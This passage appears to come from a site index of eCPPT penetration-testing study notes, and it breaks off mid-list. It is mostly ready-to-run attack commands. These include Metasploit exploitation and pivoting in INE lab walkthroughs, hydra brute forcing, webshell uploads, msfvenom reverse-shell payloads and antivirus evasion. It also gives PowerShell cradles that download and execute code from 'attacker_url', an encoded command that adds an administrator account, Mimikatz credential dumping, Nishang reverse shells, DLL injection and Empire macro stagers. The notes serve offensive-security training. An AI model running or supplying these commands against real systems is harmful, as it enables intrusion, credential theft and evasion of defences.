s3cr3tP@ss\n\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -iL computerlist.txt -u domain.com\\adm-arvanaghi -p s3cr3tP@ss -o\n\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -Target brandonArvanaghi_win7 -Thorough\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#labs","title":"Labs","text":"<p>Post-Exploitation <pre><code># Target - demo.ine.local , demo1.ine.local\n\n\n# Scan Host1\nnmap -sS -sV demo.ine.local\n\n# Httpfileserver 2.3.x is used, so exploit it with meterpreter\nmsf &gt; exploit/windows/http/rejetto_hfs_exec\nmeterpreter &gt; getsystem                       # Get System privilages\n\n# Enum applications, FileZilla Client 3.57.0 is used\nmeterpreter &gt; run post/windows/gather/enum_applications \nmeterpreter &gt; post/multi/gather/filezilla_client_cred      # Get FTP Creds\n\n# Pivoting\nmeterpreter &gt; run autoroute -s &lt;subnet_host1&gt; -n &lt;netmask&gt;\nmeterpreter &gt; run autoroute -s &lt;subnet_host2&gt; -n &lt;netmask&gt;  # For reverse_tcp\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; set version 4a\nmsf &gt; set \n\n# Scan Host2 / Port 21 is opened and connect with creds retrieved before\nproxychains ftp demo1.ine.local\nftp &gt; get username.txt                     # File of local users\n\n# Brute force local users / get them creds\nproxychains hydra -l administrator -P /usr/share/wordlists/rockyou.txt demo1.ine.local smb\nproxychains hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt demo1.ine.local smb\n\n\n# RCE on Host2\nproxychains ssh administrator@demo1.ine.local\nOR\nmsf &gt; use exploit/windows/smb/psexec\nmsf &gt; set payload windows/meterpreter/blind_tcp\nOR\nmsf &gt; use exploit/windows/smb/psexec\nmsf &gt; set payload windows/meterpreter/reverse_tcp      # Double pivoting\nmsf &gt; set LHOST host1\n</code></pre></p> <p>Blind Penetration Test <pre><code># Target - demo.ine.local\n# User/Pass Wordlists Path - /usr/share/metasploit-framework/data/wordlist/\n# WebShell Path - /usr/share/webshells/\n\n\n# Scan Host\nnmap -sS -sV demo.ine.local\n\n# Run dirb to find \"Webdav\" Directory\ndirb http://demo.ine.local\n\n# Brute force \"Webdav\" directory and get credentials\nhydra -L common_users.txt -P unix_passwords.txt demo.ine.local http-get /webdav\n\n# Run davtest tool to check if file upload/execute is possible on \"Webdav\"\ndavtest -url http://demo.ine.local/webdav -auth administrator:tigger\n\n# Upload webshell.asp to get backdoor swhell on /webdav/webshell.asp\ndavtest -url http://demo.ine.local/webdav -auth administrator:tigger  -uploadfile webshell.asp -uploadloc /\n\n# Generate meterpreter payload\nmsfvemom -p /windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; payload.exe\n\n# Upload meterpreter payload to webdav directory\ndavtest -url http://demo.ine.local/webdav -auth administrator:tigger  -uploadfile payload.exe -uploadloc /\n\n# Locate and execute payload.exe through webshell.asp backdoor\nC:\\inetpub\\wwwroot\\webdav\\payload.exe\n\n# Run Multi/Handler listener and gain meterpreter shell\nmeterpreter &gt; use exploit/multi/hanlder\n\n# Privilege Escalation\nmeterpreter &gt; run post/windows/gather/win_privs     # SeImpersonatePrivilage\nmeterpreter &gt; migrate -N w3wp.exe                   # Migrate to w3wp.exe\nmeterpreter &gt; load incognito\nmeterpreter &gt; list_tokens -u\nmeterpreter &gt; impersonate_token DOTNETGOAT\\\\Administrator\nmeterpreter &gt; getuid\nmeterpreter &gt; getsystem\n</code></pre></p> <p>Privilege Escalation <pre><code># Scan Host\nnmap -sS -sV demo.ine.local\n\n# Httpfileserver 2.3.x is used, so exploit it with meterpreter\nmsf &gt; exploit/windows/http/rejetto_hfs_exec\n\n# Check privilege escalation exploits. UACbypass exploits are presented\nmeterpreter &gt; run post/multi/recon/local_exploit_suggester\n\n# Get Administrator rights with metasploit\nmsf &gt; use exploit/windows/local/bypassuac_dotnet_profiler\nmeterpreter &gt; getsystem\n\n# OR get administrator rights with UACME\nmeterpreter &gt; upload Akagi64.exe .\nmeterpreter &gt; upload msfpayload.exe\nshell &gt; Akagi64.exe 23 C:\\\\msfpayload.exe\n\nmsf &gt; use exploit/multi/handler\nmeterpreter &gt; getsystem\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o msfpayload.exe \n</code></pre></p> <p>Privilege Escalation Via Services <pre><code># Scan Host\nnmap -sS -sV demo.ine.local\n\n# BadBlue httpd 2.7is used, so exploit it with meterpreter\nmsf &gt; exploit/windows/http/badblue_passthru\n\n# Upload PowerSploit and run Invoke-AllChecks to locate vulnerable services\nshell &gt; Import-Module .\\PowerUp.ps1\nshell &gt; Invoke-AllChecks\n\n# Abuse vulnerable service to gain Administrator rights\nshell &gt; Invoke-ServiceAbuse -Name AppReadiness \nshell &gt; Invoke-ServiceAbuse -Name AppReadiness -UserName \"test\\user\"\nshell &gt; Invoke-ServiceAbuse -Name AppReadiness -Command \"Add user to adm\"\n\n\n# Run Psexec with NT\\AUTHORITY user\n$ Impacket-Psexec test\\user@demo.ine.local\nOR\nmsf &gt; use exploit/windows/smb/psexec\n\n\n# OR Run hta server and exploit through service\nmsf &gt; use exploit/windows/misc/hta_server\nmsf &gt; exploit\n\nshell &gt; Invoke-ServiceAbuse -Name AppReadiness  -Command \"mshta.exe http://10.10.15.3:8080/ljUAsN.hta\"\n\n\n\n\nReferences:\nhttps://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/\nhttps://cheats.philkeeble.com/windows/local-privilege-escalation\n</code></pre></p> <p>Finding and Exploiting DLL Hijacking Vulnerabilities <pre><code># Run Process Monitor with following filters\nResult.      &gt; contains &gt; NAME NOT FOUND\nPath         &gt; end with &gt; .dll\nProcess Name &gt; is       &gt; dvta.exe\n\n# Check that DWrite.dll and VERSION.dll are missed payload (NAME NOT FOUND) which located directory where attacker have WRITE access.\n\n# Generate msfvenom payload and upload to directory\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o DWrite.dll\n\n$ python3 -m http.server 80\n\n# Upload file to Missed Directory and re run dvta.exe file to gain Administrator Rights.\n\n\n\nReferences:\nhttps://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/\n</code></pre></p> <p>Bypassing AV <pre><code># Veil-Framework - Generate Payload\nUse Evaseion\nUse python/meterpreter/rev_tcp.py\ngenerate\n\n# Msfvenom - Generate Payload \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe   -e x86/shikata_ga_nai -i 9 -o payload.exe\n\n\n# UPX - Compress files to Bypass AV\n$ upx --best --ultra-brute payload.exe\n\n\n# Upload file and run\n\nNOTE:  Msfvenom payloads does not work in that case\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#anonymous","title":"Anonymous","text":"<p>HTTP Proxies <pre><code># Tests\nhttps://hide.me/en/proxy\n\n# Proxy lists\nhttps://hidemy.name/en/proxy-list/\n\n# Anonymous Tools\nhttp://www.all-nettools.com/\nhttps://centralops.net/co/\nhttp://do-know.com/privacy-test.html\nhttps://pentest-tools.com/\n\n\n# TOR\nhttps://www.torproject.org/ \n\nNOTE : TOR only works for TCP streams and can be used by any application with SOCKS support\n</code></pre></p> <p>HTTP_VIA / HTTP_X_FORWRDED_FOR <pre><code># Standart HTTP Communication string\nREMOTE_ADDR = 98.10.50.155              # Target IP \nHTTP_ACCEPT_LANGUAGE = en\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)\nHTTP_HOST = www.elearnsecurity.com\nHTTP_VIA = not determined\nHTTP_X_FORWARD = not determined\n\n# Proxy Communication String\nREMOTE_ADDR = 94.86.100.1               # Proxy IP\nHTTP_ACCEPT_LANGUAGE = en\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)\nHTTP_HOST = www.elearnsecurity.com\nHTTP_VIA = 94.86.100.1 (Squid/5.4.STABLE7)    # Proxy IP\nHTTP_X_FORWARD = 98.10.50.155                 # Target IP\n\n# High Anonymity Proxy Communication String\nREMOTE_ADDR = 94.86.100.1                     # Proxy IP\nHTTP_ACCEPT_LANGUAGE = en\nHTTP_USER_AGENT = Mozilla/4.0 (compatible; MISE 5.0; Windows 98)\nHTTP_HOST = www.elearnsecurity.com\nHTTP_VIA = not determined\nHTTP_X_FORWARD = not determined\n</code></pre></p> <p>Tunneling For Anonymity <pre><code># There are specifically 2 effective types for anonymity: SSH and IPSEC VPNs\n\n# Local Port Forwarding Through SSH\nssh -L [LOCAL PORT TO LISTEN ON]:[REMOTE MACHINE]:[REMOTE PORT] [USERNAME]@[SSHSERVER]\n\n# Create a tunnel from our local port 3000, to the localhost address on the SSH server, on port 3306\nssh -L 3000:localhost:3306 els@192.168.231.135\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#social-engineering","title":"Social Engineering","text":"<pre><code># Setoolkit Tool\nhttps://github.com/trustedsec/social-engineer-toolkit\n</code></pre> <p>Linux test.deskstop <pre><code>[Desktop Entry]\nType=Application\nName=Update\nExec=/bin/bash ls -la\nIcon=/usr/share/yelp-xsl/xslt/common/icons/yelp-note-important.svg\n</code></pre></p> <p>Linux test.desktop generator</p>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/","title":"Powershell For Pentesting","text":""},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#powershell-fundamentals","title":"PowerShell Fundamentals","text":"<pre><code># PowerSploit\nhttps://github.com/PowerShellMafia/PowerSploit \n\nInvoke-AllChecks\nInvoke-PrivescAudit\n\nInvoke-ServiceAbuse -Name &lt;service_name&gt;\n</code></pre> <p>PowerShell CLI <pre><code># Executable Folders\nC:\\Windows\\System32\\WindowsPowerShell        # 64 Bit OS\nC:\\Windows\\SysWOW64\\WindowsPowerShell        # 32 Bit OS\n\n# PS History file\n%AppData%\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\n# Check if PS Process is running as 64 Bit\nPS &gt; [environment]::Is64BitOperatingSystem\n\n# PS Help menu\nPS &gt; powershell /?\n\n# ExecutionPolicy Bypass\nPS &gt; Get-ExecutionPolicy\nPS &gt; Set-ExecutionPolicy Bypass -Scope Process\n\nC:\\&gt; powershell -ExecutionPolicy Bypass .\\script.ps1\nC:\\&gt; powershell -ExecutionPolicy Unrestricted .\\script.ps1\n\n\n# Hides PS Window\nC:\\&gt; powershell -WindowStyle Hidden .\\script.ps1\n\n\n# Specify Command or Script Block\nC:\\&gt; powershell -Command [Command or Script Block]\nC:\\&gt; powershell -Command Invoke-Command -ScriptBlock { Get-Process }\nC:\\&gt; powershell -Command Invoke-Command -ScriptBlock { Get-EventLog -LogName security }\"\n\nPS &gt; Invoke-Command -ScriptBlock { param($p1, $p2)\n    \"p1: $p1\"\n    \"p2: $p2\"\n    } -ArgumentList \"First\", \"Second\"\n\n\n# Execute Base64 encoded script\nPS &gt; $string = {Get-Process}\nPS &gt; $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))\nPS &gt; powershell.exe -EncodedCommand $encodedcommand\n\n\n# Execute Script with NoProfile Parameter\nC:\\ &gt; powershell -NoProfile .\\script.ps1\n\n\n# Downgrade PS Version to 2\nC:\\ &gt; powershell -Version 2\n\n\n# Abbreviated above commands\n\npowershell.exe -ep Bypass         # ExecutionPolicy Bypass\npowershell.exe -ex by             # ExecutionPolicy Bypass\n\npowershell.exe \u2013enco              # EncodedCommand\npowershell.exe \u2013ec                # EncodedCommand\n\npowershell.exe \u2013W h               # WindowStyle Hidden\npowershell.exe \u2013Wi hi             # WindowStyle Hidden\n\n\n\n# Get-Help - Obtain Information\nPS &gt; Get-Help Get-Help\nPS &gt; Get-Help Get-Process -Full\nPS &gt; Get-Help Get-Process -Examples\nPS &gt; Get-Help Get-Process -Online\nPS &gt; Get-Update\n\n\n# List all Cmdlets, Alliases, Functions, Workflows, Filters, Scripts\nPS &gt; Get-Command \nPS &gt; Get-Command -Name *Firewall*\n</code></pre></p> <p>Cmdlets <pre><code># List all Properties of Cmdlets\nPS &gt; Get-Process | Format-List *\nPS &gt; Get-Process | Select-Object -Property *\n\n# Pipeline \nPS &gt; Get-Process | Select-Object -Property Processname\nPS &gt; Get-Process | Select-Object -First 10\nPS &gt; Get-Process | Sort-Object -Unique \nPS &gt; Get-Process | Sort-Object -Unique | Select-Object -First 10\n\n# List All Aliases\nPS &gt; Get-Alias\nPS &gt; Get-Alias -Definiton -Get-Process \n\n# WMI Objects - Operating System\nPS &gt; Get-WmiObject -Class win32_operatingsystem  | Select-Object -Property \n\n# WMI Objects - Services\nPS &gt; Get-WmiObject -Class win32_service  | fl *\nPS &gt; Get-WmiObject -Class win32_service  | Sort-Object -Unique PathName | fl PathName\n\n# List all Services\nPS &gt; Get-Service | Sort-Object Status -Descenting\n\n# Export-CSV\nPS &gt; Get-Process | Export-Csv C:\\Process.csv\n\n# Exploring Windows Registry\nPS &gt; cd HKLM:\\\nPS &gt; cd .\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n\n# Find *.txt files in Directory with Pattern - pass*\nPS &gt; Select-String -Path C:\\Directory\\*.txt -Pattern pass*\n\n# Find with Recursively - Root Directory - C:\\ | Pattern - pass* | File Extension - *.txt\nPS &gt; ls -r C:\\ -File *.txt | % {Select-String -Path $_ -Pattern pass*}\n</code></pre></p> <p>Modules <pre><code># List of Imported Modules\nPS &gt; Get-Module\nPS &gt; Get-Module -ListAvailable\n\n# Import Module\nPS &gt; Import-Module .\\script.psm1\n\n# PowerSploit\nhttps://github.com/PowerShellMafia/PowerSploit\n\nPS &gt; Improt-Module PowerSploit             # Import Module\nPS &gt; Get-Module                            # Check\nPS &gt; Get-Command -Module Powersploit # List All Available Commands of PowerSplloit\n\n\nPS &gt; Get-Help Invoke-PrivescAudit       # Help on cmdlet\nPS &gt; Get-Help Wrtie-HijackDll           # Help on cmdlet\n</code></pre></p> <p>Writing a Windows PowerShell Module </p> <p>Scripts <pre><code># List Files\nPS &gt; $file = \"script.txt\"\nPS &gt; Get-Content $file\n\n# Foreach Loop\nPS &gt; $services = Get-Service\nPS &gt; ForEach-Object ($service in $services) { $service.Name }\n\nPS &gt; Get-Service | Foreach-Object {$__.Name}\nPS &gt; Get-Service | % {$__.Name}\n\n# Where Object\nPS &gt; \u00a0Get-Service | Where-Object { $_.Status -match \"Running\"}\n</code></pre></p> <p>Script which takes an Argument and list files <pre><code> Param(\n    [Parameter(mandatory=$true)][string]$file\n)\nGet-Content \"$file\"\n</code></pre></p> <p>Port-Scanner.ps1 <pre><code>$ports=(81,444)\n$ip=\"192.168.13.250\"\n\nforeach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);}\n\ncatch{}; \n\nif ($socket -eq $null) {echo $ip\":\"$port\" - Closed\";}else{echo $ip\":\"$port\" -\nOpen\"; $socket = $null;}}\n</code></pre></p> <p>Objects <pre><code># List all available methods\nPS &gt; Get-Process | Get-Member -MemberType Method\nPS &gt; Get-Process firefox | Get-Member -MemberType Method\n\n# Kill Process\nPS &gt; Get-Process -Name firefox | Kill\n\n\n# Create New Object to Download file\nPS C:\\&gt; $webclient = New-Object System.Net.WebClient\nPS C:\\&gt; $payload_url = \"https://attacker_host/payload.exe\"\nPS C:\\&gt; $file = \u201cC:\\ProgramData\\payload.exe\"\nPS C:\\&gt; $webclient.DownloadFile($payload_url,$file)\n</code></pre></p>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#offensive-powershell","title":"Offensive PowerShell","text":""},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#download-and-execution","title":"Download and Execution","text":"<pre><code># Download And Execution In Memory. - Net.WebClient\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttp://attacker_url/script.ps1\")\n\nC:\\&gt; powershell.exe iex (New-Object Net.Webclient).DownloadString(\u2018http://attacker_url/script.ps1\u2019)\n\n-----------------------------------------------------------------------------\n\n# Download file on Disk. - Net.WebClient\nPS &gt; iex (New-Object Net.Webclient).DownloadFile(\u201chttp://attacker_url/script.ps1\", \"C:\\programdata\\payload.exe\")\n\nPS C:\\&gt; $downloader = New-Object System.Net.WebClient\nPS C:\\&gt; $payload = \"http://attacker_URL/payload.exe\"\nPS C:\\&gt; $local_file = \"C:\\programdata\\payload.exe\"\nPS C:\\&gt; $downloader.DownloadFile($payload,$local_file)\n\n-----------------------------------------------------------------------------\n\n# Use System Proxy and Default Credentials.  - Net.WebClient\nPS C:\\&gt; $downloader = New-Object System.Net.WebClient\nPS C:\\&gt; $payload = http://attacker_URL/script.ps1\nPS C:\\&gt; $cmd = $downloader.DownloadFile($payload)\nPS C:\\&gt; $proxy = [Net.WebRequest]::GetSystemWebProxy()\nPS C:\\&gt; $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials\nPS C:\\&gt; $downloader.Proxy = $proxy\nPS C:\\&gt; iex $cmd\n\n-----------------------------------------------------------------------------\n\n# Download and Execute in memory   - Net.WebRequest\nPS C:\\&gt; $req = [System.Net.WebRequest]::Create(\"http://attacker_URL/script.ps1\")\nPS C:\\&gt; $res = $req.GetResponse()\nPS C:\\&gt; iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()\n\n-----------------------------------------------------------------------------\n\n# USe System Proxy and Default Credentials  - Net.WebRequest\nPS C:\\&gt; $req = [System.Net.WebRequest]::Create(\"http://attacker_URL/script.ps1\")\nPS C:\\&gt; $res = $req.GetResponse()\nPS C:\\&gt; $proxy = [Net.WebRequest::GetSystemWebProxy()\nPS C:\\&gt; $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials\nPS C:\\&gt; $req.Proxy = $proxy\nPS C:\\&gt; iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()\n\n-----------------------------------------------------------------------------\n\n# Download and Execute in memory  - System.Xml.XmlDocument\n\nPS C:\\&gt; $xmldoc = New-Object System.Xml.XmlDocument\nPS C:\\&gt; $xmldoc.Load(\"http://attacker_URL/file.xml\")\nPS C:\\&gt; iex $xmldoc.command.a.execute\n\n\nfile.xml :\n&lt;?xml version=\"1.0\"?&gt;\n&lt;command&gt;\n&lt;a&gt;\n&lt;execute&gt;Get-Process&lt;/execute&gt;\n&lt;/a&gt;\n&lt;/command&gt;\n\n-----------------------------------------------------------------------------\n\n# Com Objects for Download and Execution  - Msxml2.XMLHTTP\nPS C:\\&gt; $downloader = New-Object \u2013ComObject Msxml2.XMLHTTP\nPS C:\\&gt; $downloader.open(\u201cGET\u201d, \u201chttp://attacker_URL/script.ps1\u201d, $false)\nPS C:\\&gt; $downloader.send()\nPS C:\\&gt; iex $downloader.responseText\n\n-----------------------------------------------------------------------------\n# Com Objects for Download and Execution  - WinHttp.WinHttpRequest.5.1\nPS C:\\&gt; $downloader = New-Object \u2013ComObject WinHttp.WinHttpRequest.5.1\nPS C:\\&gt; $downloader.open(\u201cGET\u201d, \u201chttp://attacker_URL/script.ps1\u201d, $false)\nPS C:\\&gt; $downloader.send()\nPS C:\\&gt; iex $downloader.responseText\n\n-----------------------------------------------------------------------------\n\n# ExecutionPolicy Bypass and Hiddne Window\nC:\\&gt; powershell.exe \u2013ExecutionPolicy bypass \u2013Window hidden .\\downloader.ps1 \n\n-----------------------------------------------------------------------------\n\n# Automation Script\nhttps://github.com/danielbohannon/Invoke-CradleCrafter\n</code></pre> <p>Download Evasions <pre><code># Hosted file, where SSL is presented\n\n-----------------------------------------------------------------------------\n\n# Use different Extensions. Script still executes\nPS C:\\&gt; iex (New-Object Net.Webclient).DownloadString(\u201chttp://attacker_url/logo.gif\")\n\n-----------------------------------------------------------------------------\n\n# Custom user-agent Header\nPS C:\\&gt; $downloader = New-Object System.Net.WebClient\nPS C:\\&gt; $downloader.Headers.Add(\"user-agent\", \"Mozilla/5.0 (Windows NT 10.0;\nWin64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146\nSafari/537.36\")\nPS C:\\&gt; $payload = \"http://192.168.13.62/Get-ProcessPaths.ps1\"\nPS C:\\&gt; $command = $downloader.DownloadString($payload)\nPS C:\\&gt; iex $command\n</code></pre></p> <pre><code># In Memory\n\u2022 Net.WebClient DownloadString\n\u2022 Net.WebClient DownloadData\n\u2022 Net.WebClient OpenRead \n\u2022 .NET [Net.HttpWebRequest] class\n\u2022 Word.Application COM Object\n\u2022 Excel.Application COM Object\n\u2022 InternetExplorer.Application COM Object\n\u2022 MsXml2.ServerXmlHttp Com Object\n\u2022 Certutil.exe w/ -ping argument\n\n# On Disk\n\u2022 Net.WebClient DownloadFile method\n\u2022 BITSAdmin.exe\n\u2022 Certutil.exe w/ -urlcache argument\n</code></pre>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#obfuscation","title":"Obfuscation","text":"<pre><code>#Invoke-Obfuscation\nhttps://github.com/danielbohannon/Invoke-Obfuscation\nPS &gt; Import-Module .\\Invoke-Obfuscation.psd1\n\n# Invoke-Obfuscation Commands\nInvoke-Obfuscation &gt; show options\nInvoke-Obfuscation &gt; set ScriptBlock {ps1 script we want to obfuscate}\nInvoke-Obfuscation &gt; STRING        # STRING/AST/TOKEN/ECNODING/COMPRESS...\nInvoke-Obfuscation &gt; ENCODE     \n\nInvoke-Obfuscation &gt; RESET         # Dont Append Obfuscations Each Others\nInvoke-Obfuscation &gt; LAUNCHER      # Generate Launcher\n\n\n# Base64 Encoding\nPS &gt; $command = \u2018net user admin1 \u201cp@ssw0rd9001\u201d /ADD; net localgroup administrators admin1 /add\u2019\nPS &gt; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\nPS &gt; $encodedCommand = [Convert]::ToBase64String($bytes)\nPS &gt; $encodedCommand\nPS &gt; powershell.exe -encodedcommand $encodedCommand\n</code></pre>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#information-gathering-and-recon","title":"Information Gathering And Recon","text":"<p>Host Discovery <pre><code># Powersploit - Invoke-PortScan\nPS &gt; Import-Module .\\Powersploit.psd1\nPS &gt; Invoke-PortScan -Hosts \"192.168.1.1/24\" -PingOnly\nPS &gt; Invoke-PortScan -HostFile ips.txt -PingOnly\nPS &gt; Invoke-PortScan -HostFile ips.txt -PingOnly | Export-Csv C:\\output.txt\n</code></pre></p> <p>Ports Scan <pre><code># PowerSploit - Invoke-PortScan\nPS &gt; Invoke-PortScan -HostFile live_hosts.txt -ports \"53-81\"\n\nPS &gt; Invoke-PortScan -HostFile live_hosts.txt -oG port_scan.gmap -f ports \"1-81\"\n\n-----------------------------------------------------------------------------\n\n# Posh-Secmod - Invoke-ARPScan\nhttps://github.com/darkoperator/Posh-SecMod\n\nPS &gt; Import-Module .\\Discovery.psm1\nPS &gt; Invoke-ARPScan -CIDR 192.168.1.1/24\n</code></pre></p> <p>Reverse DNS Lookup <pre><code># Posh-Secmod - Invoke-ReverseDnsLookup\nhttps://github.com/darkoperator/Posh-SecMod\n\nPS &gt; Import-Module .\\Discovery.psm1\nPS &gt; Invoke-ReverseDnsLookup -CIDR 192.168.1.1/24\n</code></pre></p> <p>DNSRecord &amp; HostRecord <pre><code>PS &gt; Resolve-DNSRecord -Target microsoft.com  -Type NS\nPS &gt; Resolve-HostRecord -Target microsoft.com\n</code></pre></p> <p>Directory Fuzzing <pre><code># PowerSploit - Get-HttpStatus\nPS &gt; Get-HttpStatus -Target example.com -Path dictionary.txt -Port 80 | ? { $_Status -match \"ok\"}\n</code></pre></p>"},{"location":"eCPPT%20Materials/Powershell%20For%20Pentesting/#post-exploitation","title":"Post Exploitation","text":"<p>Nishang - Post Exploitation <pre><code># Nishang Gather - Copy-VSS\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1\"); Copy-VSS\n\n# Nishang Gather - Get-Information\nPS &gt; \u00a0iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1\"); Get-Information\n\n# Nishang Gather - Get-PassHints\nPS &gt; \u00a0iex (New-Object Net.Webclient).DownloadString(\u201chttps://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHints.ps1\"); Get-PassHints\n\n# Nishang Gather - Invoke-Mimikatz\nPS &gt; \u00a0iex (New-Object Net.Webclient).DownloadString(\u201chttps://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1\"); Invoke-Mimikatz -DumpCreds\n\n-----------------------------------------------------------------------------\n\n# Nishang Brute Force - MSSQL, Active Directory, WEB, FTP\nPS &gt; Invoke-BruteForce \u2013ComputerName targetdomain.com \u2013UserList C:\\temp\\users.txt \u2013PasswordList C:\\temp\\pwds.txt \u2013Service ActiveDirectory \u2013StopOnSuccess -Verbose\n\n-----------------------------------------------------------------------------\n\n# Nishang Reverse PowerShell\n$ nc -nvlp 4444\nPS &gt;  iex (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress &lt;listener_IP&gt; -Port 4444\n\n-----------------------------------------------------------------------------\n</code></pre></p> <p>PowerSploit - Post Exploitation <pre><code># PowerUp - Privilege Escalation\nPS &gt; \u00a0Import-Module .\\Privesc.psm1\nPS &gt; \u00a0Get-Command -Module Privesc\nPS &gt;  Invoke-AllChecks\nPS &gt;  Invoke-AllChecks - HTMLReport\n\n-----------------------------------------------------------------------------\n\n# PowerSploit - Invoke-DllInjection\n$ msfvenom -p windows/exec CMD=\u201ccmd.exe\u201d -f dll &gt; cmd.dll\n\nPS C:\\&gt; iex (New-Object Net.Webclient).DownloadFile(\u2018http://attacker_URL/cmd.dll\u2019,\u2018C:\\programdata\\cmd.dll\u2019)\n\nPS &gt; iex (New-Object Net.Webclient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1\"); Invoke-DLLInjection \u2013ProcessID 7420 C:\\programdata\\cmd.dll\n</code></pre></p> <p>psgetsystem <pre><code># https://github.com/decoder-it/psgetsystem\n\n# Get NT\\SYSTEM Privilege form Administrator\nPS &gt; .\\psgetsys.ps1\nPS &gt; [MyProcess]::CreateProcessFromParent(system_pid,\"command_to_execute\")\n\n# Get List of NT\\SYSTEM process\nPS &gt; \u00a0Get-Process -IncludeUserName | ? {$_.username -match \"SYSTEM\"} | Select-Object -Property username,name,id\n</code></pre></p> <p>Empire - Post Exploitation <pre><code># https://github.com/EmpireProject/Empire\n\n$ git clone https://github.com/EmpireProject/Empire\n$ ./setup/install.sh\n\n(Empire) &gt; listeners\n(Empire) &gt; uselistener [TAB]\n(Empire) &gt; uselistener http\n(Empire) &gt; help\n\n# Set up SSL listener\n$ ./Empire/setup/cert.sh                  # Generate SSL keys\n(Empire: listener/http) &gt; set CertPath &lt;Directory where SSL keys are&gt;\n(Empire: listener/http) &gt; execute\n\n(Empire: listener/http) &gt; back\n(Empire: listener) &gt; listeners\n\n\n\n\n# Create Stager Payload\n(Empire: listener) &gt; usestager [TAB]\n(Empire: listener) &gt; usestager multi/launcher\n(Empire: listener/multi/launcher) &gt; info                 # list of options\n(Empire: listener/multi/launcher) &gt; set listener http    # Generated listener\n(Empire: listener/multi/launcher) &gt; execute              # Generate Payload\n\n(Empire: listener/multi/launcher) &gt; agents         # List active sessions\n\n\n\n# Agents - Sessions\n(Empire: agents) &gt; help\n(Empire: agents) &gt; interact [TAB]                  # Interact with session\n(Empire: Interact) &gt; help                          # List of Commands\n(Empire: Interact) &gt; info\n(Empire: Interact) &gt; shell whoami                  # Execute Command\n(Empire: Interact) &gt; usemodule [TAB]               # List all Modules\n(Empire: Interact) &gt; searchmodule checks           # Search Modules\n\n(Empire: Interact) &gt; usemodule privesc/powerup/allchecks\n(Empire: powershell/privesc/powerup/allchecks) &gt; execute\n\n\n\n# Client-Side Attack - Use Macro\n\n(Empire: powershell/privesc/powerup/allchecks) &gt; main\n(Empire) &gt; usestager windows/macro\n(Empire: stager/windows/macro) &gt; set listener http           \n(Empire: stager/windows/macro) &gt; set OutFile &lt;Directory&gt;\n(Empire: stager/windows/macro) &gt; execute\n\n# Open Microsoft Word with developer permission. Enter the Visual Basic Editor with ALT+F11 and paste generate macro code into it. \n</code></pre></p> <pre><code># Generate Msfvenom Payload and initiate connection from remote machine\n\nmsf &gt; use exploit/multi/handler\nmsf &gt; set payload windows/x64/meterpreter/reverse_https\n\n$ Msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f psh-reflection &gt; payload.ps1\n\nC:\\&gt; powershell.exe iex (New-Object Net.Webclient).DownloadString(\u2018http://attacker_url/payload.ps1\u2019)\n\n\n-----------------------------------------------------------------------------\n\n# Powershell Module on Meterpreter\n\nmeterpreter &gt; load powershell\nmeterpreter &gt; powershell_shell\nmeterpreter &gt; powershell_execute 'Get-Process'\n\n\n-----------------------------------------------------------------------------\n\n\n# Pass an existing active agent Empire session over metasploit\nmsf &gt; use exploit/multi/script/web_delivery\nmsf &gt; set payload windows/meterpreter/reverse_https\nmsf &gt; set target 2\nmsf &gt; exploit\n\n(Empire): usemodule powershell/code_execution/Invoke_metasploitpayload\n(Empire): info\n(Empire): set URL &lt;MSFVenom Generated Payload&gt;\n(Empire): set Agent &lt;Agent&gt;\n(Empire): execute\n</code></pre> <p>UAC Bypass PowerShell Exploit Script <pre><code>Programs which can run to HIGH integrity without promting the UAC\n1. msfconfig.exe\n2. compmgmtlauncher.exe\n3. 